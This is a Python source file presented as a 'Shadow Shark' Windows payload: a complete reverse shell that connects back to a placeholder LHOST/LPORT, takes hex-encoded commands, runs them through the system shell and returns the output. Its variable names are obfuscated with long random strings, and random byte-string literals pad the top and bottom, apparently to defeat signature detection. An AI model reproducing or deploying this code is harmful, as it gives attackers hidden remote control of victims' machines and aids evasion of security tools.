b'^o\xa3\xf3\x0bl\xc9\x15\xb5\x1a\xfc\xbb\xcfI\x0b*\xf3\xc1\xe7\x14TH\xc2\x1b\x9c%ek0\xd9\xf8\xe3'
b'\xde\xed87\x1d\xeaVK\xfb\x8a\xae\xe8\r\x0c\x10+\xc8\xe0KJyq\xa7\xbfU\xd1\xbf\r\xec7\x03\x13'
b'1\xefi5\x04v-\x17\xf8\xfc\xb77/\x987)\xef\xfc>\xcd\xe5\x0b\xdf\xbbc#\xf4\x88a\x93\x19X'
b'\xb4@oI\x9f\x93\xa9\xf2\\\xfc/\xf9\x05\xbbXx-n8\xe4\xaf\xb2dq\x1f\xef\xcf\xb8K?\x8aN'
b'7>\xcb\xaao\xa9\xbd\xf6Q~W\xfa\xd5]\x9da\xf3^qM\xaa\x81\xc9\x04H;_\xf0\xa1\x97=\xbd'
# -*- coding: utf-8 -*-
"""
A full fledged Shadow Shark payload for Windows.

@author: GAMKERS
"""
import socket
import subprocess
import os
import codecs
import json

def hex_handler(text, encode=False, decode=False):
    '''Encode or decode text using hex.'''
    if encode is True:
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = text.encode()
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = codecs.encode(MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi, encoding='hex')
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi.decode()
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = json.dumps(MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi)
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi.encode()
    if decode is True:
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = json.loads(text)
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi.encode()
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = codecs.decode(MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi, encoding='hex')
        MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi = MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi.decode()
    return MGrIjjIFvpjOJXftPYGqVexqAaaugedjCNJHyRqueijpwRoUhizBBpXfaYEEtDTi

oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.connect(('LHOST', LPORT))

while True:
    GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo = b''
    while True:
        try:
            GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo = GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo + oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.recv(1024)
            if not GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo:
                break
            if GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo[-1] == 34:
                break
        except ValueError:
            continue
    try:
        GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo = hex_handler(GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo, decode=True)
    except json.decoder.JSONDecodeError:
        continue

    if GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo == 'exit':
        oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.close()
        break

    if GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo == 'directory':
        oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler(os.getcwd() + '>', encode=True))
        continue

    xtyASaFkXNGcSPkAZoEaUdRbFjvaJeEMxjrcgewuYRHtBkHXeHSXHGPUanjvNEau = subprocess.Popen(GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        stdout = xtyASaFkXNGcSPkAZoEaUdRbFjvaJeEMxjrcgewuYRHtBkHXeHSXHGPUanjvNEau.stdout.read().decode()
    except UnicodeDecodeError:
        oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler('Could not send the data.', encode=True))
        continue
    if stdout:
        oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler(stdout, encode=True))
        continue
    stderr = xtyASaFkXNGcSPkAZoEaUdRbFjvaJeEMxjrcgewuYRHtBkHXeHSXHGPUanjvNEau.stderr.read().decode()
    if stderr:
        oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler(stderr, encode=True))
        continue

    if GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo.startswith('cd') and len(GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo.split()) >= 2:
        try:
            os.chdir(GCWrewUsvkJnlsTeYfRzgXxnXMhpvrdyZdCrhNrnCBDAbxhSMLEoOwKVScsdlYCo[3:])
        except IOError:
            oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler('The system cannot find path specified.', encode=True))
            continue

    oLtIhEDXPzojsUadsNUYbnnsEhqsKnCwTVRLLMHVIwazPDLGMGMoLvCCCyEAzFkr.send(hex_handler('\n', encode=True))
b'\x89\x86 \x95\xe7lF\x90\xf5J\xb6v\xd8\x13t\xd8\xaf\xc1V\x8f\xbem\xa4o=.\xe8n\xcd\xb1\xa9Y'
b"2\xc2\x16\x03\xe1\xea\xc1Q_'\xac^\xe9\xc8M\x16\x82\xbdw\x03\xf8Q{C\x85\x94\x03L@\x92\x07/"
b'vU\xb24\xd16\xeb\x852\x84z`\x87Z\x80\xd4\x04b$\xb2\xcf\xa8\xff\x9e\xaa6\xf4\x9a!4\xea\xf6'
b'1\xde\xc2\x8f\xa8\x9d*\xa6C\xa1\xdcF\xfd\xddx\xca2\xfeh\xba\ng\xa3\x17\x11\xd3\xc4EW5C['
b'~*\xdcXe\xa3\x84\x9c\x15L\xdd\xb2\xb7\xec\xe5\xa9<\xb5\x95\xd4%\x8c)\x96\x97\xb1X\x8c^\x99\x9b9'
